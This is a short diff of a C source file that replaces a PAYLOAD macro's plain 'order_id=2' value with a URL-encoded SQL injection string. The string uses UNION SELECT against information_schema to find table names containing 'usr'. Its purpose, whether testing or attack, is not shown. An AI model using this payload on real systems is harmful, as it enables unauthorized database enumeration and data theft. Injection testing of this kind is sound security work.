@@ -1,5 +1,5 @@
 #define __MY_DEBUG__
-#define PAYLOAD  "order_id=2"
+#define PAYLOAD "order_id=0%20UNION%20SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_name%20LIKE%20%27%25usr%25%27%20LIMIT%201%3b"
 
 #include <limits.h>
 #include <string.h>
